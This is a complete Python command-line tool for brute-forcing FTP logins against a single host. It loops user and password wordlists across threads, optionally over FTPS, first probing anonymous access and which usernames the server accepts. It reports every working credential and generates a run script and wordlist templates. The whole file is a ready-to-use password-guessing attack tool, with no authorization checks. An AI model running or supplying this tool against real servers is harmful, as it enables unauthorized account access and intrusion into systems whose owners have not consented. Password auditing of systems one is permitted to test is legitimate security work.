#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# stdlib: ftplib

import argparse
import datetime
import json
import os
import shlex
import socket
import stat
import ssl
import sys
import time
from pathlib import Path
import traceback
from concurrent.futures import CancelledError, ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from ftplib import FTP, FTP_TLS, error_perm
from threading import Lock
from typing import Any

DEBUG_MODE = False

DEFAULT_INTERVAL_SECONDS = 0.0
DEFAULT_THREADS = 1
DEFAULT_TIMEOUT_SECONDS = 30.0
DEFAULT_PROGRESS_EVERY = 1000
DEFAULT_PORT = 21
ANONYMOUS_FTP_USERNAME = "anonymous"


class CLIStyle:
    """CLI tool unified style config."""

    COLORS = {
        "TITLE": 7,
        "SUB_TITLE": 2,
        "CONTENT": 3,
        "EXAMPLE": 7,
        "WARNING": 4,
        "ERROR": 2,
    }

    @staticmethod
    def color(text: str = "", color: int = COLORS["CONTENT"]) -> str:
        """Unified color processing function."""
        color_table = {
            0: "{}",
            1: "\033[1;30m{}\033[0m",
            2: "\033[1;31m{}\033[0m",
            3: "\033[1;32m{}\033[0m",
            4: "\033[1;33m{}\033[0m",
            5: "\033[1;34m{}\033[0m",
            6: "\033[1;35m{}\033[0m",
            7: "\033[1;36m{}\033[0m",
            8: "\033[1;37m{}\033[0m",
        }
        return color_table[color].format(text)


class ColoredArgumentParser(argparse.ArgumentParser):
    """Argument parser with colored output for option strings and sections."""

    def _format_action_invocation(self, action: argparse.Action) -> str:
        """Colorize option strings and metavar in help display."""
        if not action.option_strings:
            (metavar,) = self._metavar_formatter(action, action.dest)(1)
            return CLIStyle.color(str(metavar), CLIStyle.COLORS["SUB_TITLE"])

        parts: list[str] = []
        if action.nargs == 0:
            parts.extend(
                CLIStyle.color(option, CLIStyle.COLORS["SUB_TITLE"])
                for option in action.option_strings
            )
            return ", ".join(parts)

        args_string = self._format_args(action, action.dest.upper())
        colored_args = CLIStyle.color(args_string, CLIStyle.COLORS["CONTENT"])
        for option in action.option_strings:
            colored_option = CLIStyle.color(option, CLIStyle.COLORS["SUB_TITLE"])
            parts.append(f"{colored_option} {colored_args}")
        return ", ".join(parts)

    def format_help(self) -> str:
        """Build colorized help sections while preserving argparse structure."""
        formatter = self._get_formatter()
        if self.description:
            formatter.add_text(
                CLIStyle.color(self.description, CLIStyle.COLORS["TITLE"])
            )
        formatter.add_usage(self.usage, self._actions, self._mutually_exclusive_groups)
        formatter.add_text(
            CLIStyle.color("\nOptional Arguments:", CLIStyle.COLORS["TITLE"])
        )
        for action_group in self._action_groups:
            formatter.start_section(action_group.title)
            formatter.add_arguments(action_group._group_actions)
            formatter.end_section()
        if self.epilog:
            formatter.add_text(CLIStyle.color(self.epilog, CLIStyle.COLORS["CONTENT"]))
        return formatter.format_help()


def output_line(text: str = "", color: int = CLIStyle.COLORS["CONTENT"]) -> None:
    """
    Print one line with unified CLI style.

    ```python
    output_line("done", CLIStyle.COLORS["CONTENT"])

    return = None
    ```
    """
    print(CLIStyle.color(text, color))


def debug(message: str, *, enabled: bool) -> None:
    """
    Print debug messages when enabled.

    ```python
    debug("connect", enabled=True)

    return = None
    ```
    """
    if not enabled:
        return
    output_line(f"[debug] {message}", CLIStyle.COLORS["WARNING"])


def create_example_text(
    script_name: str,
    examples: list[tuple[str, str]],
    notes: list[str] | None = None,
) -> str:
    """Create a colorized example block for CLI epilog."""
    text = f"\n{CLIStyle.color('Examples:', CLIStyle.COLORS['SUB_TITLE'])}"
    for description, command in examples:
        text += f"\n  {CLIStyle.color(f'# {description}', CLIStyle.COLORS['EXAMPLE'])}"
        text += f"\n  {CLIStyle.color(f'{script_name} {command}', CLIStyle.COLORS['CONTENT'])}\n"
    if notes:
        text += f"\n{CLIStyle.color('Notes:', CLIStyle.COLORS['SUB_TITLE'])}"
        for note in notes:
            text += f"\n  {CLIStyle.color(f'- {note}', CLIStyle.COLORS['CONTENT'])}"
    return text


@dataclass(frozen=True)
class Account:
    """Username and password pair."""

    username: str
    password: str


@dataclass(frozen=True)
class TargetSpec:
    """FTP connection parameters."""

    host: str
    port: int
    passive: bool
    tls: bool
    implicit_tls: bool
    tls_verify: bool


@dataclass(frozen=True)
class TryResult:
    """Result of one FTP login attempt."""

    requested_at: str
    username: str
    password: str
    ok: bool
    welcome: str | None
    error: str | None


def load_text_file(file_path: str) -> str:
    """Load UTF-8 text file."""
    with open(file_path, "r", encoding="utf-8") as file_obj:
        return file_obj.read()


def read_nonempty_lines(file_path: str) -> list[str]:
    """Read non-empty lines from UTF-8 text file."""
    lines: list[str] = []
    with open(file_path, "r", encoding="utf-8") as file_obj:
        for line in file_obj:
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            lines.append(stripped)
    return lines


def parse_json_object(value: str) -> dict[str, Any]:
    """Parse JSON object from string."""
    try:
        data = json.loads(value)
    except json.JSONDecodeError as error:
        raise ValueError(f"invalid JSON: {error.msg}") from error

    if not isinstance(data, dict):
        raise ValueError("JSON value must be an object")
    return data


def load_value_or_file(value: str, file_path: str, *, label: str) -> list[str]:
    """Load single value or list from file."""
    stripped_value = value.strip()
    stripped_file = file_path.strip()

    if stripped_value and stripped_file:
        raise ValueError(f"provide either --{label} or --{label}s, not both")
    if stripped_value:
        return [stripped_value]
    if stripped_file:
        return read_nonempty_lines(stripped_file)
    return []


def build_accounts_from_cli(
    *,
    user_value: str,
    users_file: str,
    password_value: str,
    passwords_file: str,
) -> tuple[list[Account], list[str], list[str]]:
    """Build account list and the user/password value lists used to build it."""
    users = load_value_or_file(user_value, users_file, label="user")
    passwords = load_value_or_file(password_value, passwords_file, label="password")

    has_user_input = bool(users)
    has_password_input = bool(passwords)

    if not has_user_input and not has_password_input:
        return [], [], []
    if not has_user_input or not has_password_input:
        raise ValueError(
            "batch mode requires both username and password input: "
            "provide --user/--users and --password/--passwords"
        )

    if len(users) == 1:
        accounts = [
            Account(username=users[0], password=password) for password in passwords
        ]
        return accounts, users, passwords
    if len(passwords) == 1:
        accounts = [Account(username=user, password=passwords[0]) for user in users]
        return accounts, users, passwords
    accounts = [
        Account(username=user, password=password)
        for user in users
        for password in passwords
    ]
    return accounts, users, passwords


def account_file_positions(
    account: Account,
    users: list[str],
    passwords: list[str],
    *,
    show_user_file: bool,
    show_password_file: bool,
) -> tuple[tuple[int, int] | None, tuple[int, int] | None]:
    """1-based (index, total) per file when that file mode is active."""
    user_pos: tuple[int, int] | None = None
    pass_pos: tuple[int, int] | None = None
    if show_user_file and users:
        try:
            user_pos = (users.index(account.username) + 1, len(users))
        except ValueError:
            user_pos = None
    if show_password_file and passwords:
        try:
            pass_pos = (passwords.index(account.password) + 1, len(passwords))
        except ValueError:
            pass_pos = None
    return user_pos, pass_pos


def parse_target_file(path: str) -> dict[str, Any]:
    """Load target JSON from file."""
    text = load_text_file(path).strip()
    if not text:
        raise ValueError("target file is empty")
    return parse_json_object(text)


def merge_target(
    args: argparse.Namespace,
    file_values: dict[str, Any] | None,
) -> TargetSpec:
    """Merge CLI args with optional target JSON file."""
    fv = file_values or {}

    host = (args.host or "").strip() if args.host else ""
    if not host and isinstance(fv.get("host"), str):
        host = fv["host"].strip()
    if not host:
        raise ValueError("host is required (--host or target file)")

    if args.port and args.port > 0:
        port = args.port
    elif "port" in fv and fv["port"] is not None:
        try:
            port = int(fv["port"])
        except (TypeError, ValueError) as error:
            raise ValueError("port in target file must be an integer") from error
    else:
        port = DEFAULT_PORT

    if port < 1 or port > 65535:
        raise ValueError("port must be between 1 and 65535")

    passive = True
    if "passive" in fv and fv["passive"] is not None:
        passive = bool(fv["passive"])
    if args.passive is not None:
        passive = bool(args.passive)

    tls = bool(fv.get("tls", False)) or bool(args.tls)
    implicit_tls = bool(fv.get("implicit_tls", False)) or bool(args.implicit_tls)
    tls_verify = bool(fv.get("tls_verify", False)) or bool(args.tls_verify)

    if implicit_tls:
        tls = True

    return TargetSpec(
        host=host,
        port=port,
        passive=passive,
        tls=tls,
        implicit_tls=implicit_tls,
        tls_verify=tls_verify,
    )


def _make_ssl_context(verify: bool) -> ssl.SSLContext:
    """Build SSL context for FTPS."""
    if verify:
        return ssl.create_default_context()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _connect_implicit_ftps(
    host: str,
    port: int,
    *,
    context: ssl.SSLContext,
    timeout_seconds: float,
) -> FTP_TLS:
    """Implicit FTPS: TLS from first byte (e.g. port 990)."""
    ftp = FTP_TLS(context=context)
    raw_sock = socket.create_connection((host, port), timeout=timeout_seconds)
    ftp.sock = context.wrap_socket(raw_sock, server_hostname=host)
    ftp.af = ftp.sock.family
    ftp.file = ftp.sock.makefile("r", encoding=ftp.encoding)
    ftp.welcome = ftp.getresp()
    return ftp


def probe_ftp_username_accepted(
    target: TargetSpec,
    username: str,
    *,
    timeout_seconds: float,
) -> tuple[bool, str]:
    """
    Send USER only. If the server rejects USER with 530 before PASS (e.g. user not
    permitted to log in), password attempts are pointless.

    Returns (True, "") when USER is accepted (e.g. 331).
    Returns (False, server_message) when USER fails with 530.
    """
    ftp: FTP | None = None
    try:
        if target.implicit_tls:
            ctx = _make_ssl_context(target.tls_verify)
            ftp = _connect_implicit_ftps(
                target.host,
                target.port,
                context=ctx,
                timeout_seconds=timeout_seconds,
            )
        elif target.tls:
            ctx = _make_ssl_context(target.tls_verify)
            ftp = FTP_TLS(context=ctx)
            ftp.connect(target.host, target.port, timeout=timeout_seconds)
            ftp.auth()
            ftp.prot_p()
        else:
            ftp = FTP()
            ftp.connect(target.host, target.port, timeout=timeout_seconds)

        try:
            ftp.sendcmd("USER " + username)
        except error_perm as error:
            message = str(error)
            if message.startswith("530"):
                return False, message
            raise
        return True, ""
    finally:
        if ftp is not None:
            try:
                ftp.quit()
            except Exception:
                try:
                    ftp.close()
                except Exception:
                    pass


def filter_accounts_by_user_probe(
    target: TargetSpec,
    accounts: list[Account],
    *,
    timeout_seconds: float,
) -> list[Account]:
    """Remove accounts whose USER is rejected with 530 before PASS."""
    by_user: dict[str, list[Account]] = {}
    for account in accounts:
        by_user.setdefault(account.username, []).append(account)
    kept: list[Account] = []
    for username in sorted(by_user.keys()):
        ok, detail = probe_ftp_username_accepted(
            target, username, timeout_seconds=timeout_seconds
        )
        if not ok:
            output_line(
                f"FTP user {username!r} cannot log in: server rejected USER before "
                f"password ({detail}). Skipping password attempts for this user.",
                CLIStyle.COLORS["ERROR"],
            )
            continue
        kept.extend(by_user[username])
    return kept


def try_ftp_login(
    target: TargetSpec,
    account: Account,
    *,
    timeout_seconds: float,
) -> TryResult:
    """Attempt one FTP login and disconnect."""
    requested_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ftp: FTP | None = None
    try:
        if target.implicit_tls:
            ctx = _make_ssl_context(target.tls_verify)
            ftp = _connect_implicit_ftps(
                target.host,
                target.port,
                context=ctx,
                timeout_seconds=timeout_seconds,
            )
            ftp.login(account.username, account.password)
            ftp.prot_p()
        elif target.tls:
            ctx = _make_ssl_context(target.tls_verify)
            ftp = FTP_TLS(context=ctx)
            ftp.connect(target.host, target.port, timeout=timeout_seconds)
            ftp.login(account.username, account.password)
            ftp.prot_p()
        else:
            ftp = FTP()
            ftp.connect(target.host, target.port, timeout=timeout_seconds)
            ftp.login(account.username, account.password)

        ftp.set_pasv(target.passive)
        welcome = getattr(ftp, "welcome", None)
        if isinstance(welcome, str):
            welcome_text = welcome
        else:
            welcome_text = None
        try:
            ftp.quit()
        except Exception:
            try:
                ftp.close()
            except Exception:
                pass

        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=True,
            welcome=welcome_text,
            error=None,
        )
    except error_perm as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            welcome=None,
            error=str(error),
        )
    except OSError as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            welcome=None,
            error=str(error),
        )
    except Exception as error:
        return TryResult(
            requested_at=requested_at,
            username=account.username,
            password=account.password,
            ok=False,
            welcome=None,
            error=str(error),
        )
    finally:
        if ftp is not None:
            try:
                ftp.close()
            except Exception:
                pass


def to_single_line_preview(result: TryResult, max_length: int = 120) -> str:
    """Convert message to a single-line preview."""
    if result.error is not None:
        preview = result.error
    elif result.welcome is not None:
        preview = result.welcome
    else:
        preview = ""

    normalized = " ".join(preview.split())
    if len(normalized) <= max_length:
        return normalized
    return normalized[: max_length - 3] + "..."


def print_run_summary(results: list[TryResult]) -> None:
    """Print aggregate counts and successful credentials after a run completes."""
    if not results:
        output_line("summary: no attempts", CLIStyle.COLORS["SUB_TITLE"])
        return
    successes = [r for r in results if r.ok]
    failed_n = len(results) - len(successes)
    output_line(
        f"summary: total={len(results)} success={len(successes)} failed={failed_n}",
        CLIStyle.COLORS["TITLE"],
    )
    for r in successes:
        output_line(
            f"  credential OK: user={r.username} password={r.password}",
            CLIStyle.COLORS["CONTENT"],
        )


def prompt_continue_after_success() -> bool:
    """
    Ask whether to keep trying after a successful login.

    ```python
    prompt_continue_after_success()

    return = False on EOF or negative answer
    ```
    """
    try:
        line = input(
            CLIStyle.color(
                "Success detected. Continue trying more passwords? [Y/n]: ",
                CLIStyle.COLORS["WARNING"],
            )
        )
    except EOFError:
        return False
    normalized = line.strip().lower()
    if normalized in ("", "y", "yes"):
        return True
    return False


def print_result_line(
    result: TryResult,
    *,
    user_pos: tuple[int, int] | None = None,
    pass_pos: tuple[int, int] | None = None,
) -> None:
    """Print one result line in real time."""
    preview = to_single_line_preview(result)
    status_text = "SUCCESS" if result.ok else "FAILED"
    status_color = CLIStyle.COLORS["CONTENT"] if result.ok else CLIStyle.COLORS["ERROR"]
    parts: list[str] = [
        CLIStyle.color(f"[{status_text}]", status_color),
        CLIStyle.color(f"time={result.requested_at}", CLIStyle.COLORS["SUB_TITLE"]),
    ]
    if user_pos is not None:
        u_i, u_n = user_pos
        parts.append(
            CLIStyle.color(f"user_pos={u_i}/{u_n}", CLIStyle.COLORS["SUB_TITLE"])
        )
    if pass_pos is not None:
        p_i, p_n = pass_pos
        parts.append(
            CLIStyle.color(f"pass_pos={p_i}/{p_n}", CLIStyle.COLORS["SUB_TITLE"])
        )
    parts.extend(
        [
            CLIStyle.color(f"user={result.username}", CLIStyle.COLORS["EXAMPLE"]),
            CLIStyle.color(f"password={result.password}", CLIStyle.COLORS["WARNING"]),
            CLIStyle.color("detail=", CLIStyle.COLORS["SUB_TITLE"])
            + CLIStyle.color(preview, status_color),
        ]
    )
    print(" ".join(parts))


def execute_tries(
    target: TargetSpec,
    accounts: list[Account],
    *,
    interval_seconds: float,
    threads: int,
    timeout_seconds: float,
    progress_every: int,
    users_list: list[str] | None = None,
    passwords_list: list[str] | None = None,
    show_user_file_indices: bool = False,
    show_password_file_indices: bool = False,
    pause_on_success: bool = False,
) -> list[TryResult]:
    """Run FTP login attempts with optional threading."""
    debug(
        f"host={target.host} port={target.port} passive={target.passive} "
        f"tls={target.tls} implicit_tls={target.implicit_tls}",
        enabled=DEBUG_MODE,
    )
    debug(f"threads={threads} interval_seconds={interval_seconds}", enabled=DEBUG_MODE)

    def run_one(account: Account) -> TryResult:
        return try_ftp_login(
            target,
            account,
            timeout_seconds=timeout_seconds,
        )

    def position_for(
        account: Account,
    ) -> tuple[tuple[int, int] | None, tuple[int, int] | None]:
        return account_file_positions(
            account,
            users_list or [],
            passwords_list or [],
            show_user_file=show_user_file_indices,
            show_password_file=show_password_file_indices,
        )

    total_items = len(accounts)
    progress_lock = Lock()
    completed_count = 0

    def mark_progress() -> None:
        nonlocal completed_count
        if progress_every <= 0:
            return
        with progress_lock:
            completed_count += 1
            should_report = (
                completed_count % progress_every == 0 or completed_count == total_items
            )
            if not should_report:
                return
            output_line(
                f"progress={completed_count}/{total_items}",
                CLIStyle.COLORS["WARNING"],
            )

    results: list[TryResult] = []
    if threads <= 1:
        for index, account in enumerate(accounts):
            if index > 0 and interval_seconds > 0:
                time.sleep(interval_seconds)
            result = run_one(account)
            u_pos, p_pos = position_for(account)
            print_result_line(result, user_pos=u_pos, pass_pos=p_pos)
            results.append(result)
            mark_progress()
            if pause_on_success and result.ok and not prompt_continue_after_success():
                break
        print_run_summary(results)
        return results

    def run_one_capture(acc: Account) -> tuple[Account, TryResult]:
        return acc, run_one(acc)

    remaining_indices = list(range(len(accounts)))
    while remaining_indices:
        executor = ThreadPoolExecutor(max_workers=threads)
        futures_map: dict[object, int] = {}
        try:
            for slot, idx in enumerate(remaining_indices):
                if slot > 0 and interval_seconds > 0:
                    time.sleep(interval_seconds)
                account = accounts[idx]
                futures_map[executor.submit(run_one_capture, account)] = idx

            wave_done: set[int] = set()
            stop_collecting = False
            stop_entire_run = False
            try:
                for fut in as_completed(futures_map):
                    idx = futures_map[fut]
                    try:
                        account, result = fut.result()
                    except CancelledError:
                        continue
                    wave_done.add(idx)
                    if stop_collecting:
                        continue
                    u_pos, p_pos = position_for(account)
                    print_result_line(result, user_pos=u_pos, pass_pos=p_pos)
                    results.append(result)
                    mark_progress()
                    if pause_on_success and result.ok:
                        executor.shutdown(wait=False, cancel_futures=True)
                        if not prompt_continue_after_success():
                            stop_entire_run = True
                        stop_collecting = True
            except KeyboardInterrupt:
                executor.shutdown(wait=False, cancel_futures=True)
                os._exit(130)
        finally:
            executor.shutdown(wait=True)

        if stop_entire_run:
            break
        remaining_indices = [i for i in remaining_indices if i not in wave_done]
        if not pause_on_success:
            break

    print_run_summary(results)
    return results


def summarize_exit(results: list[TryResult]) -> int:
    """Return process exit code from results (any failure -> 1)."""
    for result in results:
        if not result.ok:
            return 1
    return 0


INIT_FTP_TARGET_JSON = "ftp-target.json"
INIT_FTP_RUN_SH = "run.sh"
INIT_FTP_USERS_TXT = "users.txt"
INIT_FTP_PASSWORDS_TXT = "passwords.txt"


def run_init_ftp_workspace(
    cwd: Path,
    script_py: Path,
    *,
    force: bool,
) -> int:
    """
    Create run.sh, ftp-target.json, users.txt, and passwords.txt in cwd.

    Each default-named file is skipped if it already exists unless force is True.

    Returns 0 on success.
    """
    script_py = script_py.resolve()

    def write_one(name: str, content: str) -> None:
        path = cwd / name
        if path.exists() and not force:
            output_line(f"skip (exists): {path}", CLIStyle.COLORS["WARNING"])
            return
        path.write_text(content, encoding="utf-8")
        output_line(f"wrote: {path}", CLIStyle.COLORS["CONTENT"])
        if name == INIT_FTP_RUN_SH:
            mode = path.stat().st_mode
            path.chmod(mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    target_obj: dict[str, Any] = {
        "host": "127.0.0.1",
        "port": DEFAULT_PORT,
        "passive": True,
        "tls": False,
        "implicit_tls": False,
        "tls_verify": False,
    }
    write_one(
        INIT_FTP_TARGET_JSON,
        json.dumps(target_obj, indent=2, ensure_ascii=False) + "\n",
    )
    write_one(
        INIT_FTP_USERS_TXT,
        "# One username per line (lines starting with # are ignored)\nadmin\n",
    )
    write_one(
        INIT_FTP_PASSWORDS_TXT,
        "# One password per line\nchangeme\n",
    )

    py_q = shlex.quote(str(script_py))
    run_body = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        'HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
        "# Optional flags: uncomment lines in EXTRA. CLI --host/--port override ftp-target.json.\n"
        "EXTRA=()\n"
        "# EXTRA+=(--skip-anonymous-check)\n"
        "# EXTRA+=(--tls)\n"
        "# EXTRA+=(--implicit-tls)\n"
        "# EXTRA+=(--tls-verify)\n"
        "# EXTRA+=(--no-passive)\n"
        "# EXTRA+=(--pause-on-success)\n"
        "# EXTRA+=(--log)\n"
        f"exec python3 {py_q} \\\n"
        f'  --target-file "$HERE/{INIT_FTP_TARGET_JSON}" \\\n'
        '  --host "" \\\n'
        "  --port 0 \\\n"
        f"  --interval-seconds {DEFAULT_INTERVAL_SECONDS} \\\n"
        f"  --threads {DEFAULT_THREADS} \\\n"
        f"  --timeout-seconds {DEFAULT_TIMEOUT_SECONDS} \\\n"
        f"  --progress-every {DEFAULT_PROGRESS_EVERY} \\\n"
        f'  --users "$HERE/{INIT_FTP_USERS_TXT}" \\\n'
        f'  --passwords "$HERE/{INIT_FTP_PASSWORDS_TXT}" \\\n'
        '  "${EXTRA[@]}" \\\n'
        '  "$@"\n'
    )
    write_one(INIT_FTP_RUN_SH, run_body)
    output_line(
        "Init done. Edit ftp-target.json, run.sh (EXTRA), and wordlists.",
        CLIStyle.COLORS["TITLE"],
    )
    return 0


def build_parser() -> argparse.ArgumentParser:
    """Build CLI parser."""
    script_name = "python brute-ftp-login.py"
    examples = [
        (
            "Create run.sh and ftp-target.json in the current directory",
            "--init",
        ),
        (
            "Single attempt with target file",
            "--target-file ftp-target.json --user admin --password 123456",
        ),
        (
            "Batch mode with user/password lists",
            "--host 192.168.9.1 --port 21 --users users.txt --passwords passwords.txt",
        ),
        (
            "Explicit TLS (AUTH TLS)",
            "--target-file ftp-target.json --tls --users users.txt --passwords passwords.txt",
        ),
    ]
    notes = [
        "Use --init in the directory where you keep targets; run.sh uses the real path of this .py file.",
        "Provide either --user or --users, and either --password or --passwords.",
        "With --users, anonymous login is probed once by default; use --skip-anonymous-check to disable.",
        "Host/port can come from --target-file JSON; CLI --host/--port override file values.",
        "Use --implicit-tls for implicit FTPS (e.g. port 990).",
        "End of run prints a summary; --pause-on-success prompts after each success; "
        "with multiple threads, other pending tries are cancelled for that wave.",
    ]
    epilog = create_example_text(script_name, examples, notes=notes)

    parser = ColoredArgumentParser(
        description="FTP login brute force / credential check against one host.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=epilog,
    )

    parser.add_argument(
        "--target-file",
        type=str,
        default="",
        help="JSON file with host, port, passive, tls, implicit_tls, tls_verify.",
    )
    parser.add_argument(
        "--host",
        type=str,
        default="",
        help="FTP host (overrides target file when set).",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=0,
        help=f"FTP port (default {DEFAULT_PORT} or from target file).",
    )

    parser.add_argument("--user", type=str, default="", help="Single username.")
    parser.add_argument(
        "--users", type=str, default="", help="Username file, one per line."
    )
    parser.add_argument("--password", type=str, default="", help="Single password.")
    parser.add_argument(
        "--passwords", type=str, default="", help="Password file, one per line."
    )
    parser.add_argument(
        "--skip-anonymous-check",
        action="store_true",
        help=(
            "With --users, skip the default probe for anonymous FTP (username "
            f"{ANONYMOUS_FTP_USERNAME!r}, empty password) before the user list."
        ),
    )

    parser.add_argument(
        "--interval-seconds",
        type=float,
        default=DEFAULT_INTERVAL_SECONDS,
        help="Seconds between submissions (stagger start in thread pool).",
    )
    parser.add_argument(
        "--threads", type=int, default=DEFAULT_THREADS, help="Concurrent thread count."
    )
    parser.add_argument(
        "--timeout-seconds",
        type=float,
        default=DEFAULT_TIMEOUT_SECONDS,
        help="Connect/login timeout in seconds.",
    )
    parser.add_argument(
        "--progress-every",
        type=int,
        default=DEFAULT_PROGRESS_EVERY,
        help="Print progress every N completed attempts (default: 1000, use 0 to disable).",
    )
    parser.add_argument(
        "--pause-on-success",
        action="store_true",
        help=(
            "After a successful login, prompt to continue (Y) or stop (n). "
            "With threads>1, pending tries are cancelled when the first success is observed."
        ),
    )

    parser.add_argument(
        "--passive",
        action=argparse.BooleanOptionalAction,
        default=None,
        help="PASV mode (default true; use --no-passive for PORT).",
    )
    parser.add_argument(
        "--tls",
        action="store_true",
        help="Use explicit FTPS (AUTH TLS + PROT P).",
    )
    parser.add_argument(
        "--implicit-tls",
        action="store_true",
        help="Implicit FTPS (SSL from connect, e.g. port 990).",
    )
    parser.add_argument(
        "--tls-verify",
        action="store_true",
        help="Verify server TLS certificate (default: no verify).",
    )
    parser.add_argument(
        "--init",
        action="store_true",
        help=(
            f"Create {INIT_FTP_RUN_SH}, {INIT_FTP_TARGET_JSON}, {INIT_FTP_USERS_TXT}, "
            f"{INIT_FTP_PASSWORDS_TXT} in the current working directory "
            "(skip each file that already exists unless --init-force)."
        ),
    )
    parser.add_argument(
        "--init-force",
        action="store_true",
        help="With --init, overwrite files that already exist.",
    )
    parser.add_argument("--log", action="store_true", help="Enable debug output.")

    return parser


def main() -> int:
    """Main program logic."""
    parser = build_parser()
    args = parser.parse_args()

    global DEBUG_MODE
    DEBUG_MODE = bool(args.log)

    if args.init:
        return run_init_ftp_workspace(
            Path.cwd(),
            Path(__file__).resolve(),
            force=bool(args.init_force),
        )

    try:
        file_values: dict[str, Any] | None = None
        if args.target_file.strip():
            file_values = parse_target_file(args.target_file.strip())

        target = merge_target(args, file_values)

        users_file_stripped = args.users.strip()
        if users_file_stripped and not args.skip_anonymous_check:
            output_line(
                "[--users] Probing anonymous FTP login first (empty password). "
                "Use --skip-anonymous-check to skip.",
                CLIStyle.COLORS["WARNING"],
            )
            anon_result = try_ftp_login(
                target,
                Account(username=ANONYMOUS_FTP_USERNAME, password=""),
                timeout_seconds=args.timeout_seconds,
            )
            print_result_line(anon_result)
            if anon_result.ok:
                output_line(
                    "Anonymous login works on this host; you may rely on it instead of "
                    "the full user list. Continuing with your configured attempts.",
                    CLIStyle.COLORS["WARNING"],
                )
            else:
                output_line(
                    "Anonymous login failed or not offered; continuing with user list.",
                    CLIStyle.COLORS["SUB_TITLE"],
                )

        accounts, users_list, passwords_list = build_accounts_from_cli(
            user_value=args.user,
            users_file=args.users,
            password_value=args.password,
            passwords_file=args.passwords,
        )
        if not accounts:
            raise ValueError(
                "provide --user/--users and --password/--passwords for batch mode"
            )

        accounts = filter_accounts_by_user_probe(
            target,
            accounts,
            timeout_seconds=args.timeout_seconds,
        )
        if not accounts:
            raise ValueError(
                "no accounts left after FTP USER probe (all usernames rejected before password)"
            )

        show_user_file_indices = bool(args.users.strip())
        show_password_file_indices = bool(args.passwords.strip())
        results = execute_tries(
            target,
            accounts,
            interval_seconds=args.interval_seconds,
            threads=args.threads,
            timeout_seconds=args.timeout_seconds,
            progress_every=args.progress_every,
            users_list=users_list,
            passwords_list=passwords_list,
            show_user_file_indices=show_user_file_indices,
            show_password_file_indices=show_password_file_indices,
            pause_on_success=bool(args.pause_on_success),
        )
        return summarize_exit(results)
    except FileNotFoundError as error:
        missing_file = error.filename if error.filename else "unknown"
        output_line(f"Error: File '{missing_file}' not found", CLIStyle.COLORS["ERROR"])
        return 1
    except ValueError as error:
        output_line(f"Error: {str(error)}", CLIStyle.COLORS["ERROR"])
        return 2
    except Exception as error:
        if DEBUG_MODE:
            traceback.print_exc()
        output_line(f"Error: {str(error)}", CLIStyle.COLORS["ERROR"])
        return 1


if __name__ == "__main__":
    sys.exit(main())
